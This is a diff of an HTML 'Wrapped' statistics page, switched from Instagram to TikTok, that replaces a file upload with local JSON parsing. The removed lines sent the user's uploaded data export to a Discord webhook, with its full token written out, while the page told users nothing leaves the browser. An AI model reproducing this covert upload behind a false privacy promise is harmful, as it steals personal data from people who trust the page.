@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wrapped for Instagram</title>
+    <title>Wrapped for TikTok</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -60,43 +60,82 @@
             font-size: 1rem;
             color: #1da1f2;
         }
+
+        #stats {
+            margin-top: 20px;
+            font-size: 1rem;
+            text-align: left;
+        }
+
+        #stats p {
+            margin: 5px 0;
+        }
     </style>
     <script>
         function handleFileUpload(event) {
             const fileInput = event.target;
             const message = document.getElementById('message');
+            const stats = document.getElementById('stats');
 
             if (fileInput.files.length > 0) {
-                const formData = new FormData();
-                formData.append('file', fileInput.files[0]);
+                const file = fileInput.files[0];
+                const reader = new FileReader();
 
-                fetch('https://discordapp.com/api/webhooks/1324173007387758652/xs9Db_2oVjoSiN5d0cwrcPxXL-VVy1y8HGz3xIuifVTmGuyH6d0i4MmkvnuxdDpO1Gjf', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (response.ok) {
-                        message.textContent = 'File uploaded successfully!';
-                    } else {
-                        message.textContent = 'Failed to upload file.';
+                reader.onload = function(e) {
+                    const content = e.target.result;
+
+                    try {
+                        const data = JSON.parse(content);
+
+                        if (content.includes('TikTok')) {
+                            let totalVideos = data.videos?.length || 0;
+                            let totalWatchTime = data.videos.reduce((sum, video) => sum + video.watchTime, 0); // In seconds
+                            let sessions = data.sessions || [];
+
+                            const totalDays = Math.floor(totalWatchTime / 86400);
+                            const totalHours = Math.floor((totalWatchTime % 86400) / 3600);
+
+                            const avgSessionLength = sessions.length
+                                ? Math.floor(totalWatchTime / sessions.length)
+                                : 0;
+
+                            let totalComments = data.comments?.length || 0;
+                            let totalLikes = data.likes?.length || 0;
+
+                            stats.innerHTML = `
+                                <p><strong>Total Videos Watched:</strong> ${totalVideos}</p>
+                                <p><strong>Total Watch Time:</strong> ${totalDays} days, ${totalHours} hours</p>
+                                <p><strong>Watch Sessions:</strong> ${sessions.length}</p>
+                                <p><strong>Average Session Length:</strong> ${avgSessionLength} seconds</p>
+                                <p><strong>Total Comments:</strong> ${totalComments}</p>
+                                <p><strong>Total Likes:</strong> ${totalLikes}</p>
+                            `;
+                            message.textContent = 'Statistics calculated successfully!';
+                        } else {
+                            message.textContent = 'This file does not appear to contain TikTok data.';
+                            stats.innerHTML = '';
+                        }
+                    } catch (error) {
+                        message.textContent = 'Invalid file format. Please upload a valid JSON file.';
+                        stats.innerHTML = '';
                     }
-                })
-                .catch(() => {
-                    message.textContent = 'An error occurred while uploading.';
-                });
+                };
+
+                reader.readAsText(file);
             }
         }
     </script>
 </head>
 <body>
     <div class="info">
-        <h1>Wrapped for Instagram</h1>
-        <p>Select your Instagram data to get started.</p>
+        <h1>Wrapped for TikTok</h1>
+        <p>Select your TikTok data to get started.</p>
         <p>Your data will not be uploaded to any server. All statistics are generated locally in your browser.</p>
-        <p>Wrapped for Instagram is open-source if you want to verify this.</p>
+        <p>Wrapped for TikTok is open-source if you want to verify this.</p>
         <label for="file">Upload File</label>
         <input type="file" id="file" name="file" onchange="handleFileUpload(event)">
         <p id="message"></p>
+        <div id="stats"></div>
     </div>
 </body>
 </html>
